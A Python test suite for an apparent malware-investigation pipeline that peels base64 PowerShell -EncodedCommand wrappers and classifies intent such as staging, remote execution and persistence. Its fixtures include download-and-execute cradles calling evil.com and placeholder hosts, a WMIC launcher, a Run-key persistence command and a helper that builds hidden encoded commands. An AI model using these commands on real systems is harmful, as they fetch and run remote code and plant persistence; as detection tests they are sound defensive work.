"""Unified Investigation Pipeline · regression suite.

Locks in end-to-end deterministic behaviour of the IU → CRE → RTE
→ Intent flow so analysts always see the same investigation for
the same input.
"""
from __future__ import annotations

import base64

import pytest

from v2.investigation.iu.models import ArtefactType, Capability
from v2.investigation.pipeline import investigate
from v2.investigation.intent.models import IntentCategory


def _enc(script: str) -> str:
    """Wrap ``script`` in a `powershell.exe -EncodedCommand` string."""
    b = base64.b64encode(script.encode("utf-16-le")).decode()
    return f"powershell.exe -w Hidden -EncodedCommand {b}"


# ── Full-pipeline golden samples ────────────────────────────────
def test_wmic_encodedcommand_download_cradle():
    """Real-world shape: WMIC → CMD → PowerShell EncodedCommand →
    download cradle. Every stage must fire and the final intent must
    include staging + remote_execution + runtime_dependent."""
    inner = ('iex (New-Object Net.WebClient).DownloadString('
              '"http://evil.com/stage2.ps1")')
    b = base64.b64encode(inner.encode("utf-16-le")).decode()
    cmd = f'wmic process call create "powershell.exe -EncodedCommand {b}"'

    r = investigate(cmd)

    assert r.coverage == ["iu", "cre", "rte", "intent", "verdict", "graph"]
    assert r.iu.primary_type == ArtefactType.COMMAND_LINE
    assert Capability.CRE in r.iu.dispatch
    assert r.cre is not None
    assert "DownloadString" in r.cre.effective_payload
    fired = {i.category for i in r.intent.intents}
    assert {IntentCategory.STAGING,
            IntentCategory.REMOTE_EXECUTION,
            IntentCategory.RUNTIME_DEPENDENT} <= fired


def test_bare_encoded_command_ps():
    """Plain `powershell.exe -EncodedCommand` should still peel the
    encoded script and infer intent from the plaintext."""
    inner = ('Set-ItemProperty -Path '
              '"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
              '-Name Updater -Value calc.exe')
    r = investigate(_enc(inner))

    assert "cre" in r.coverage and "rte" in r.coverage
    # CRE peeled the -EncodedCommand into an effective payload, so RTE
    # has nothing further to do. The IU classification on that payload
    # must recognise it as a PowerShell script.
    assert r.cre is not None
    assert "HKCU" in r.cre.effective_payload
    assert r.rte.artifacts[0].classification.primary_type == ArtefactType.POWERSHELL_SCRIPT
    # Persistence intent must fire on the peeled plaintext.
    fired = {i.category for i in r.intent.intents}
    assert IntentCategory.PERSISTENCE in fired


def test_benign_input_no_high_signal():
    """Benign PowerShell must NOT fire adversarial intents."""
    r = investigate('Get-Process | Sort-Object CPU -Descending | Select -First 5')
    fired = {i.category for i in r.intent.intents}
    forbidden = {
        IntentCategory.STAGING,
        IntentCategory.REMOTE_EXECUTION,
        IntentCategory.PERSISTENCE,
        IntentCategory.CREDENTIAL_ACCESS,
    }
    assert fired.isdisjoint(forbidden), (
        f"Benign Get-Process should not fire {fired & forbidden}"
    )


def test_pipeline_determinism():
    """The unified pipeline must produce byte-identical output on
    replay — a hard invariant for the Investigation Brain."""
    cmd = _enc('iex (New-Object Net.WebClient).DownloadString("http://x/y")')
    r1 = investigate(cmd)
    r2 = investigate(cmd)
    r3 = investigate(cmd)
    assert r1.determinism_hash == r2.determinism_hash == r3.determinism_hash


def test_pipeline_empty_input_is_safe():
    """Empty input must not raise and must produce a coherent empty
    investigation."""
    for empty in ("", "   ", None):
        r = investigate(empty or "")
        assert r.coverage == ["iu", "rte", "intent"] or r.coverage[0] == "iu"
        assert r.rte.depth == 0
        assert r.intent.intents == []


def test_pipeline_to_dict_serialization():
    """The full investigation must serialize to a JSON-safe dict with
    every stage's canonical output present."""
    cmd = _enc('iex (New-Object Net.WebClient).DownloadString("http://x")')
    d = investigate(cmd).to_dict()
    assert set(d.keys()) == {
        "input", "iu", "cre", "rte", "intent", "verdict", "graph",
        "coverage", "determinism_hash"
    }
    # Every stage has its determinism proof.
    assert d["iu"]["determinism_hash"]
    assert d["cre"]["determinism_hash"]
    assert d["rte"]["determinism_hash"]
    assert d["intent"]["determinism_hash"]
    # Verdict and Graph must be present with expected shape.
    assert d["verdict"]["band"] in {"malicious", "suspicious",
                                     "runtime_dependent", "benign"}
    assert d["graph"]["nodes"] and d["graph"]["edges"]
    # Final layer content is analyst-readable.
    layers = d["rte"]["artifacts"]
    assert layers and any("DownloadString" in a["content"] for a in layers)


def test_pipeline_naked_powershell_skips_cre():
    """A naked PowerShell script has no CRE wrapper, so CRE is
    still invoked (IU dispatches it) but the effective payload is
    the original script."""
    ps = 'iex (New-Object Net.WebClient).DownloadString("http://x")'
    r = investigate(ps)
    # CRE runs (naked PS still classifies with Capability.CRE) but
    # produces a passthrough effective payload.
    if r.cre is not None:
        assert r.cre.effective_payload == ps or ps in r.cre.effective_payload
    # Intent should still fire on the raw script.
    fired = {i.category for i in r.intent.intents}
    assert {IntentCategory.STAGING, IntentCategory.REMOTE_EXECUTION} <= fired


def test_pipeline_full_intent_summary_is_deterministic():
    """The intent summary paragraph is a pure function of fired
    intents — identical inputs produce identical summaries."""
    cmd = _enc('iex (New-Object Net.WebClient).DownloadString("http://x/y")')
    r1 = investigate(cmd)
    r2 = investigate(cmd)
    assert r1.intent.summary == r2.intent.summary
